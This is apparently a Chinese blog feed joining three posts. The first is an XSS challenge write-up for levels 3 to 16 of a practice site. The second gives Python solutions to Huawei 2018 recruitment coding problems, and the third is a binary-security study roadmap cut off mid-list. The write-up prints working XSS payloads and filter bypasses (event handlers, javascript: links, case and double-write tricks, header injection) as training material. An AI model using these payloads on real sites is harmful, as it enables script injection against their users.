class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onchange='alert()</span></span><br><span class="line">移动鼠标经过输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmousemove='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmouseout='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onmouseover='alert()</span></span><br><span class="line">点击输入框，进行按键操作</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeydown='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeyup='alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword=' onkeypress='alert()</span></span><br><span class="line">双击输入框</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level3.php?keyword='  ondblclick='alert()</span></span><br><span class="line"></span><br><span class="line">更多可用事件可以参考这里：https:<span class="comment">//www.w3schools.com/tags/ref_eventattributes.asp</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的单引号并在标签中添加事件。</span><br></pre></td></tr></table></figure><h1 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level4.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"findneo=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，在标签属性值中过滤了尖括号。</span><br><span class="line">把上一题payload的单引号换成双引号应该都可以用</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level4.php?keyword=" onfocus='alert()' autofocus="</span></span><br><span class="line"></span><br><span class="line">收获：闭合标签属性的双引号并在标签中添加事件。</span><br></pre></td></tr></table></figure><h1 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level5.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签属性值没有编码</span><br><span class="line">进一步测试发现query会转成小写，&lt;script，on等敏感词会加下划线</span><br><span class="line">看起来事件和script标签都不好使，可以闭合原来的标签，自己添加标签，然后试着用用刚从书里学到的伪协议</span><br><span class="line">点击findneo就能弹</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword="&gt;&lt;a href="javascript:alert(1);"&gt;findneo&lt;/a&gt;</span></span><br><span class="line">做一下美化</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level5.php?keyword=" type="hidden"/&gt;&lt;a href="javascript:alert(1);"&gt;aa&lt;/a&gt;&lt;input type="hidden</span></span><br><span class="line">vbscript和dataURI似乎都不能奏效。</span><br><span class="line"></span><br><span class="line">收获：利用JavaScript伪协议。</span><br></pre></td></tr></table></figure><h1 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line"></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-findneo=&#123;()&#125;/\相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line"></span><br><span class="line">进一步测试发现&lt;script,on,href都被加下划线了，但是没有做全部转小写的操作，所以可以大小写绕过。</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level6.php?keyword="&gt;&lt;Script&gt;alert()&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line">收获：大小写绕过敏感词检测。</span><br></pre></td></tr></table></figure><h1 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level7.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>;!-<span class="string">"&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;</span><br><span class="line"></span><br><span class="line">在文本中编码了双引号、尖括号和&amp;，标签值属性没有编码</span><br><span class="line">进一步测试发现on,script,href都被替换为空，但只执行一次，没有递归操作，可以用关键字嵌套来绕过。</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level7.php?keyword="&gt;&lt;soncript&gt;alert()&lt;/soncript&gt;</span></span><br><span class="line"></span><br><span class="line">收获：关键字嵌套（双写）绕过敏感词过滤。</span><br></pre></td></tr></table></figure><h1 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level8.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span>&gt;</span><br><span class="line">&lt;a href=<span class="string">"';!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/\&amp;"</span>&gt;友情链接&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">input标签的value属性输出处编码了双引号、尖括号和&amp;；a标签的href属性输出处编码了双引号。</span></span><br><span class="line"><span class="regexp">进一步测试发现数据都被转小写，on,script,href,data等都被加下划线了。</span></span><br><span class="line"><span class="regexp">一番查找资料发现了可以通过JavaScript变换（利用空白符如水平制表符HT，换行符LF，回车键CR来截断关键字）的办法绕过</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/47.94.13.75/</span>test/level8.php?keyword=javas%<span class="number">09</span>cript:alert()</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0acript:alert()</span></span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level8.php?keyword=javas%0dcript:alert()</span></span><br><span class="line"></span><br><span class="line">可在http:<span class="comment">//wps2015.org/drops/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</span></span><br><span class="line">页面内搜索“JavaScript变换”看到相关信息。</span><br><span class="line"></span><br><span class="line">收获：空白符（特殊的结束标识符）绕过敏感词检测。</span><br></pre></td></tr></table></figure><h1 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level9.php?keyword=http://';!-"&lt;finDneo&gt;=&#123;()&#125;/\&amp;</span></span><br><span class="line">&lt;input name=keyword  value=<span class="string">"http://';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href="http:/</span><span class="regexp">/';!-&amp;quot&lt;findneo&gt;=&#123;()&#125;/</span>\&amp;<span class="string">"&gt;友情链接&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输入数据全部转为小写，且必须协议正确，刚开始以为必须以“http://”开头，后来发现只要含有就可以了。</span></span><br><span class="line"><span class="string">input标签的值编码了双引号、尖括号和&amp;；href处编码了双括号。</span></span><br><span class="line"><span class="string">从上一题稍作变化即可</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level9.php?keyword=javas%09cript:alert('http://')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：如果要检测URL协议，应该检测协议名是否在字符串的开头。</span></span><br></pre></td></tr></table></figure><h1 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level10.php?keyword=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">&lt;h2 align=center&gt;没有找到和<span class="string">';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;相关的结果.&lt;/h2&gt;</span></span><br><span class="line"><span class="string">只有一个输出点，编码了双引号、尖括号和&amp;。谷歌了很久，都说这几乎是不可能成的。（If angle brackets and double quote characters are escaped, this is enough to prevent XSS in HTML body and double quoted entity value contexts.）</span></span><br><span class="line"><span class="string">无奈之下查了writeup，发现自己观察能力需要提高，显著的hidden就在眼皮底下，竟然一点都没有注意到。</span></span><br><span class="line"><span class="string">有一个隐藏的表单如下：</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">可尝试其参数是否可能被注入</span></span><br><span class="line"><span class="string">访问47.94.13.75/test/level10.php?keyword=asdf&amp;t_link="&amp;t_history="&amp;t_sort="</span></span><br><span class="line"><span class="string">会发现在相应中t_sort是可注入双引号的，于是可以构造链接弹窗。</span></span><br><span class="line"><span class="string">http://47.94.13.75/test/level10.php?t_sort="  autofocus onfocus=alert() type="text</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">收获：注意测试隐藏元素。</span></span><br><span class="line"><span class="string">这道题乍一看有些让人摸不着头脑，但仔细想想觉得这在真实环境中是会发生的。开发者利用隐藏的表单提交数据，然后就默认这些数据是可靠的，于是在忘记或者认为没必要在服务端做校验，这就导致了代码的缺陷。像本题的t_sort键就是个例子，所以如果遇到hidden的元素可以测一测。</span></span><br></pre></td></tr></table></figure><h1 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">test1:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?keyword=&amp;t_link="&lt;xss&gt;&amp;t_history="&lt;xss&gt;&amp;t_sort='&lt;xss&gt;&amp;t_ref="&lt;xss&gt;</span></span><br><span class="line">与上一题类似，表单中多了一个t_ref，但看起来只有t_sort可以注入。</span><br><span class="line">test2:view-source:http:<span class="comment">//47.94.13.75/test/level11.php?t_sort=';!-"&lt;findneo&gt;=&#123;()&#125;/\%26</span></span><br><span class="line">得到：&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"';!-&amp;quot;&amp;lt;findneo&amp;gt;=&#123;()&#125;/\&amp;amp;"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">对双引号、尖括号和&amp;进行了编码。input标签中value属性的双引号难以逃逸。</span><br><span class="line">考虑莫名多出来的t_ref,猜测服务端是取请求头的referer值来返回，于是截包添加请求头。</span><br><span class="line">referer: <span class="string">" autofocus onfocus=alert() type="</span>text</span><br><span class="line"></span><br><span class="line">收获：寻找一些可能的、可控的输入！</span><br></pre></td></tr></table></figure><h1 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level12.php?keyword=findneo</span></span><br><span class="line">与上一题相似，这题修改的是UA。</span><br><span class="line"></span><br><span class="line">收获：User-Agent（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure><h1 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="comment">//47.94.13.75/test/level13.php?keyword=findneo</span></span><br><span class="line">与前面类似，修改Cookie。</span><br><span class="line"></span><br><span class="line">收获：Cookie（以及HTTP请求头的其他部分）也是可控的输入。</span><br></pre></td></tr></table></figure><h1 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php</span></span><br><span class="line">测试发现编码了/和空格</span><br><span class="line">将后面内容注释掉，使用无需闭合的标签，使用特殊空白符代替空格即可</span><br><span class="line">http:<span class="comment">//47.94.13.75/test/level16.php?keyword=findneo&lt;img%0asrc=''%0aonerror=alert(1)&gt;&lt;!--</span></span><br><span class="line"></span><br><span class="line">收获：注释符，空白符</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>华为2018年校园招聘软件题</title>
      <link href="/180404HuaweiExam/"/>
      <url>/180404HuaweiExam/</url>
      
        <content type="html"><![CDATA[<blockquote><p>2018.4.3 19:00 ~ 2018.4.3 21:00</p></blockquote><h1 id="求回文子字符串数量"><a href="#求回文子字符串数量" class="headerlink" title="求回文子字符串数量"></a>求回文子字符串数量</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(s)</span>:</span></span><br><span class="line">    length=len(s)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">if</span> s[i]!=s[length<span class="number">-1</span>-i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">s=sys.stdin.readline().strip()</span><br><span class="line">res=<span class="number">0</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(s)+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> check(s[i:j]):</span><br><span class="line">                res=max(res,len(s[i:j]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure><h1 id="根据规则输出IPv6地址类型"><a href="#根据规则输出IPv6地址类型" class="headerlink" title="根据规则输出IPv6地址类型"></a>根据规则输出IPv6地址类型</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(ip)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(ip)!=<span class="number">8</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    s=<span class="string">"0123456789abcdefABCDEF"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="string">''</span>.join(ip)).strip():</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">s=sys.stdin.readline().split(<span class="string">":"</span>) </span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> check(s):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error"</span></span><br><span class="line"><span class="keyword">elif</span> int(s[<span class="number">0</span>],<span class="number">16</span>)^<span class="number">0xfe80</span>&lt;(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"LinkLocal"</span></span><br><span class="line"><span class="keyword">elif</span> int(s[<span class="number">0</span>],<span class="number">16</span>)^<span class="number">0xfec0</span>&lt;(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"SiteLocal"</span></span><br><span class="line"><span class="keyword">elif</span> int(s[<span class="number">0</span>],<span class="number">16</span>)^<span class="number">0xff00</span>&lt;(<span class="number">2</span>**<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Multicast"</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">":"</span>.join(s).strip()==<span class="string">"0000:0000:0000:0000:0000:0000:0000:0000"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Unspecified"</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">":"</span>.join(s).strip()==<span class="string">"0000:0000:0000:0000:0000:0000:0000:0001"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Loopback"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"GlobalUnicast"</span></span><br></pre></td></tr></table></figure><h1 id="试用软件赚流量方案"><a href="#试用软件赚流量方案" class="headerlink" title="试用软件赚流量方案"></a>试用软件赚流量方案</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_t</span><span class="params">(down)</span>:</span></span><br><span class="line">    t_all=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(down)):</span><br><span class="line">        <span class="keyword">if</span> down[i]==<span class="string">'1'</span>:</span><br><span class="line">            t_all+=appt[i]</span><br><span class="line">    <span class="comment">#print t_all,t,down</span></span><br><span class="line">    <span class="keyword">return</span> t_all&lt;=t</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_m</span><span class="params">(down)</span>:</span></span><br><span class="line">    m_all=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(down)):</span><br><span class="line">        <span class="keyword">if</span> down[i]==<span class="string">'1'</span>:</span><br><span class="line">            m_all+=appm[i]</span><br><span class="line">    <span class="keyword">return</span> m_all</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prior</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="comment">#print a</span></span><br><span class="line">    <span class="comment">#print b</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> int(a,<span class="number">2</span>)&gt;int(b,<span class="number">2</span>) <span class="keyword">else</span> b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(down)</span>:</span></span><br><span class="line">    res=[]</span><br><span class="line">    res.extend([str(i+<span class="number">1</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(down)) <span class="keyword">if</span> down[i]==<span class="string">'1'</span>])</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">" "</span>.join(res)).strip() <span class="comment">#,down</span></span><br><span class="line"></span><br><span class="line">t=int(sys.stdin.readline().strip())</span><br><span class="line">appt=map(int,sys.stdin.readline().strip().split())</span><br><span class="line">appm=map(int,sys.stdin.readline().strip().split())</span><br><span class="line">length=len(appt)</span><br><span class="line">res,money=<span class="string">"0"</span>*length,<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>**length):</span><br><span class="line">    down=bin(i)[<span class="number">2</span>:].zfill(length)</span><br><span class="line">    <span class="keyword">if</span> check_t(down):</span><br><span class="line">        tmpm=get_m(down)</span><br><span class="line">        <span class="keyword">if</span> tmpm &gt;money:</span><br><span class="line">            res,money=down,tmpm</span><br><span class="line">        <span class="keyword">elif</span> tmpm == money:</span><br><span class="line">            res=get_prior(down,res)</span><br><span class="line">parse(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>二进制安全学习规划指南</title>
      <link href="/180404BinStarter/"/>
      <url>/180404BinStarter/</url>
      
        <content type="html"><![CDATA[<blockquote><p>note of <a href="https://www.ichunqiu.com/course/56927" target="_blank" rel="noopener">https://www.ichunqiu.com/course/56927</a></p></blockquote><h1 id="Hacking三步曲"><a href="#Hacking三步曲" class="headerlink" title="Hacking三步曲"></a>Hacking三步曲</h1><ul><li>理解系统（Understanding）<ul><li>系统性的基础课程学习，深入理解计算机系统运作机制。</li></ul></li><li>破坏系统（Breaking）<ul><li>学习与创造漏洞挖掘与利用技巧</li></ul></li><li>重构系统（Reconstruction）<ul><li>设计与构建系统防护</li></ul></li></ul><h1 id="基础课程学习"><a href="#基础课程学习" class="headerlink" title="基础课程学习"></a>基础课程学习</h1><h2 id="核心基础课程——计算机的工作原理"><a href="#核心基础课程——计算机的工作原理" class="headerlink" title="核心基础课程——计算机的工作原理"></a>核心基础课程——计算机的工作原理</h2><ul><li><p><strong>体系结构</strong></p><ul><li>CPU的设计与实现<ul><li>机器指令与汇编语言</li><li>指令的解码、执行</li><li>内存管理</li></ul></li><li>CMU 18-447 Introduction to Computer Architecture<ul><li><a href="https://www.ece.cmu.edu/~ece447/s15/doku.php" target="_blank" rel="noopener">https://www.ece.cmu.edu/~ece447/s15/doku.php</a></li><li>Labs: implement a MIPS CPU using Verilog</li></ul></li></ul></li><li><p><strong>编译原理</strong></p><ul><li>编译器的设计与实现<ul><li>自动机、词法分析、句法分析</li><li>运行时</li><li>程序静态分析</li></ul></li><li>Stanford CS-143 - Compilers<ul><li><a href="http://web.stanford.edu/class/cs143/" target="_blank" rel="noopener">http://web.stanford.edu/class/cs143/</a></li><li>PA: Compilers for cool language</li></ul></li></ul></li><li><p><strong>操作系统</strong></p><ul><li><p>操作系统的设计与实现</p><ul><li>系统的加载与引导</li><li>用户态和内核态、系统调用、中断和驱动</li><li>进程于内存管理、文件系统</li><li>虚拟机</li></ul></li><li><p>NT 6.828 - Operating System Engineering</p><ul><li><p><a href="https://pdos.csail.mit.edu/6.828/2016/" target="_blank" rel="noopener">https://pdos.csail.mit.edu/6.828/2016/</a></p></li><li><p>Labs: Implement jos</p></li><li><p>Xv6 , a simple Unix-like teaching operating system</p></li></ul></li></ul></li></ul><h2 id="其他基础课程——系统软件开发基础"><a href="#其他基础课程——系统软件开发基础" class="headerlink" title="其他基础课程——系统软件开发基础"></a>其他基础课程——系统软件开发基础</h2><ul><li><p>编程语言</p></li><li><p>网络协议</p></li><li><p>算法与数据结构</p></li></ul><h1 id="漏洞挖掘与利用"><a href="#漏洞挖掘与利用" class="headerlink" title="漏洞挖掘与利用"></a>漏洞挖掘与利用</h1><h2 id="快速入门——CTF"><a href="#快速入门——CTF" class="headerlink" title="快速入门——CTF"></a>快速入门——CTF</h2><ul><li>蓝莲花战队CTF成长秘诀——坚持超过一年的以赛代练<ul><li>9447CTF、CCC CTF、HITCON CTF、Plaid CTF、Boston Key Party、DEF CON CTF</li></ul></li><li>CTF 历史资料库：<a href="https://github.com/ctfs" target="_blank" rel="noopener">https://github.com/ctfs</a></li><li><p>Wargames:</p><ul><li><p><a href="https://pwnable.kr/" target="_blank" rel="noopener">https://pwnable.kr/</a></p></li><li><p><a href="http://smashthestack.org/" target="_blank" rel="noopener">http://smashthestack.org/</a></p></li></ul></li></ul><h2 id="如何从CTF赛棍转型"><a href="#如何从CTF赛棍转型" class="headerlink" title="如何从CTF赛棍转型"></a>如何从CTF赛棍转型</h2><ul><li>CTF <ul><li>短时间（48h）、目标代码量少、漏洞容易发现、利用技巧千奇百怪</li></ul></li><li>实战——长期做一道很难的CTF题<ul><li>长期（长年累月）、目标代码量大、漏洞难以发现、利用技术有套路可循</li></ul></li></ul><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><ul><li><strong>目标</strong><ul><li>网络协议的实现<ul><li>HTTP/SMB/DNS/UPnP Server</li></ul></li><li>脚本引擎<ul><li>JavaScript Engine</li><li>ActionScript Engine</li><li>PHP/Java Sandbox Escape</li></ul></li><li>内核<ul><li>Linux/Android</li><li>Freebsd</li><li>Apple iOS</li><li>Sony 